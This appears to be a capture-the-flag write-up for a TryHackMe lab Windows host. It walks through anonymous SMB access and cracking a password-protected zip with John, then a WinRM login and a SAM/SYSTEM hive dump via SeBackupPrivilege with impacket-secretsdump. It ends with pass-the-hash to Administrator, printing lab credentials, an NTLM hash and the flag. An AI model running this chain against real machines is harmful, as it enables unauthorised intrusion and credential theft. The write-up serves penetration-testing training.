# WRK.TRYHACKME.LOC

## Machine Info

NetBIOS\_Domain\_Name: `TRYHACKME`

NetBIOS\_Computer\_Name: `WRK`

DNS\_Domain\_Name: `tryhackme.loc`

DNS\_Computer\_Name: `WRK.tryhackme.loc`

## Ports Scan

```bash
nmap -T4 -A -p- --min-rate 1000 --open -oN port_scan.txt wrk.tryhackme.loc -Pn

Nmap scan report for wrk.tryhackme.loc (10.200.150.20)
Host is up (0.043s latency).
Not shown: 63043 closed tcp ports (reset), 2477 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: TRYHACKME
|   NetBIOS_Domain_Name: TRYHACKME
|   NetBIOS_Computer_Name: WRK
|   DNS_Domain_Name: tryhackme.loc
|   DNS_Computer_Name: WRK.tryhackme.loc
|   DNS_Tree_Name: tryhackme.loc
|   Product_Version: 10.0.17763
|_  System_Time: 2025-08-14T07:30:00+00:00
| ssl-cert: Subject: commonName=WRK.tryhackme.loc
| Not valid before: 2025-04-09T09:59:17
|_Not valid after:  2025-10-09T09:59:17
|_ssl-date: 2025-08-14T07:30:08+00:00; -1s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
```



## Initial Access

### SMB Anonymous Access

Enumerating SMB (Port 445) with the tool smbclient the anonymous/guest auth is enabled and an attacker find and read the content of the shared directory `Safe` .

```bash
smbclient -L //wrk.tryhackme.loc -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Safe            Disk      

```

An attacker with this command can access into that dir

```bash
smbclient -N //wrk.tryhackme.loc/Safe
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Apr 23 16:19:43 2025
  ..                                  D        0  Wed Apr 23 16:19:43 2025
  creds.zip                           A      263  Wed Apr  2 17:20:25 2025
```

An attacker can found the creds.zip file, can download it and read it.

{% code overflow="wrap" %}
```bash
smb: \> get creds.zip 
getting file \creds.zip of size 263 as creds.zip (1.5 KiloBytes/sec) (average 1.5 KiloBytes/sec)
```
{% endcode %}

The file is protected by a password and an attacker that want to read the content has need for the password that protect the zip file.&#x20;

An Attacker can entract the HASH and can try to crack it with tools like hashcat or JohnTheRipper.

Extract the hash with the tool `zip2john` and save the output into a file.

{% code overflow="wrap" %}
```bash
zip2john creds.zip > zip_hash
creds.zip/creds.txt:$zip2$*0*3*0*1b75a3d69af91bc7f02b61d78c6e32c3*c730*19*01efe96e8f42be4ca63b114bd5bdd87c3427076775ca151a5e*75e5de324b6fbaac4c6f*$/zip2$:creds.txt:creds.zip:creds.zip
```
{% endcode %}

Now an attacker can try to crack the hash with John.

```bash
john zip_hash --wordlist=/usr/share/wordlists/rockyou.txt

Passw0rd         (creds.zip/creds.txt) 
```

The password can been cracked with this command because has a very easy format.

Using that password an attacker can extract the content of the zip directory with the following command:

```bash
7z e creds.zip

Enter password (will not be echoed): REDACTED
```

The file content a user and password for the machine. An attacker can access remotly to the machine through the WinRM protocol and using tools like `evil-winrm`.

```bash
evil-winrm -i wrk.tryhackme.loc -u 'john' -p 'VerySafePassword!'
```



## Privilege Escalation

### Enumerate Machine as John User

An attacker can enumerate the user privilege and information with this command:

```
whoami /all
```

From this command an attacker can understand that the user is a Domain User and has SeBackupPrivilege privilege.

With this privilege an attacker can perform a dump of the local machine hashes executing these commands that doing a request to registry for the SAM and SYSTEM file:

```
reg save hklm\sam c:\Temp\sam
reg save hklm\system c:\Temp\system
```

Now an attacker can download them using the `download` function of the `evil-winrm` tool.

```
download sam
download system
```

With these file an attacker can extract the hash stored into them using the `impacket-secretsdump` tool.

```
impacket-secretsdump -sam sam -system system LOCAL

[*] Target system bootKey: 0xfa0661c3eee8696eeb436f2bafa060e7
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d0b2fa8fcb95040b72f5a9dd58a0c187:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:95f2822ae7e725c8e30b2b31f66c1b86:::
```

An attacker with the Administrator NTLM hash, can try to access to the machine as `Administrator` using the Pass-the-Hash technique, with the tool `evil-winrm`.

{% code overflow="wrap" %}
```bash
evil-winrm -i wrk.tryhackme.loc -u 'Administrator' -H 'd0b2fa8fcb95040b72f5a9dd58a0c187'
```
{% endcode %}

As Administrator an attacker has obtained the **full control of the machine**.



### Administrator Flag

```
more C:\flag.txt
THM{4ba6ee11-8546-4b5e-8112-ff3d9d22e67a}
```

